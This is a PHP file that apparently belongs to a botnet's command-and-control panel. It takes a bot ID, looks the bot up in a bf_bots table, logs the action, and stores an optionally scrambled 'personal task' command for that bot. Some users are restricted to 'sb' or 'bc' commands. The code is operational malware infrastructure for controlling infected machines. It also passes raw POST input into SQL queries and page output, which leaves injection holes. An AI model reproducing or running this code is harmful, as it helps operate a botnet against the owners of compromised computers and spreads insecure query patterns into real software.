<?php

function str2db($str){
	global $config, $rc;
	get_function('rc');
	
	if($config['scramb'] == 1){
		return rc_encode($str);
	}else{
		return $str;
	}
}

function db2str($str){
	global $config, $rc;
	get_function('rc');
	if($config['scramb'] == 1){
		return rc_decode($str);
	}else{
		return $str;
	}
}

if(!empty($Cur['id'])){
	$bot = $mysqli->query('SELECT id, prefix, uid FROM bf_bots WHERE (id = \''.$Cur['id'].'\') LIMIT 1');

	if($bot->id == $Cur['id']){
		if($_SESSION['user']->config['sbbc'] == true){
			if(function_exists('save_history_log')){
				thl('Action: Add/Edit/Delete personal task - sbbc');
				thl('Bot UID: ' . $bot->prefix . $bot->uid);
				thl('CMD: ' . $_POST['cmd']);
				save_history_log();
			}
			
			if(preg_match('~^([!]+)?(sb|bc)~is', $_POST['cmd']) == true){
				if($config['scramb'] == 1 && (!empty($_POST['cmd']))){
					$cmd_text = $_POST['cmd'];
					if(strpos($_POST['cmd'], '$') === 0){
						$add_cmd = '$';
						$_POST['cmd'] = str_replace('$', '', $_POST['cmd']);
					}elseif(strpos($_POST['cmd'], '!!!') === 0){
						$add_cmd = '!!!';
						$_POST['cmd'] = str_replace('!!!', '', $_POST['cmd']);
					}elseif(strpos($_POST['cmd'], '!!') === 0){
						$add_cmd = '!!';
						$_POST['cmd'] = str_replace('!!', '', $_POST['cmd']);
					}elseif(strpos($_POST['cmd'], '!') === 0){
						$add_cmd = '!';
						$_POST['cmd'] = str_replace('!', '', $_POST['cmd']);
					}
					
					$_POST['cmd'] = $add_cmd . str2db($_POST['cmd']);
				}
				
				$mysqli->query('UPDATE bf_bots SET cmd = \''.$_POST['cmd'].'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
			}else{
				print_r('<script>alert(\'No Access!\');this.textContent = \'\';</script>');
				exit;
			}
		}else{
			if(function_exists('save_history_log')){
				thl('Action: Add/Edit/Delete personal task');
				thl('Bot UID: ' . $bot->prefix . $bot->uid);
				thl('CMD: ' . $_POST['cmd']);
				save_history_log();
			}
			
			if($config['scramb'] == 1 && (!empty($_POST['cmd']))){
				$cmd_text = $_POST['cmd'];
				if(strpos($_POST['cmd'], '$') === 0){
					$add_cmd = '$';
					$_POST['cmd'] = str_replace('$', '', $_POST['cmd']);
				}elseif(strpos($_POST['cmd'], '!!!') === 0){
					$add_cmd = '!!!';
					$_POST['cmd'] = str_replace('!!!', '', $_POST['cmd']);
				}elseif(strpos($_POST['cmd'], '!!') === 0){
					$add_cmd = '!!';
					$_POST['cmd'] = str_replace('!!', '', $_POST['cmd']);
				}elseif(strpos($_POST['cmd'], '!') === 0){
					$add_cmd = '!';
					$_POST['cmd'] = str_replace('!', '', $_POST['cmd']);
				}
				
				$_POST['cmd'] = $add_cmd . str2db($_POST['cmd']);
			}
			
			$mysqli->query('UPDATE bf_bots SET cmd = \''.$_POST['cmd'].'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		}
		
		if(!empty($_POST['cmd'])){
			if(!empty($cmd_text)){
				print_r($cmd_text);
			}else{
				print_r($_POST['cmd']);
			}
		}else{
			print_r('<script></script>');
		}
	}else{
		print_r('Error!');
		exit;
	}
}else{
	print_r('Error!');
	exit;
}

?>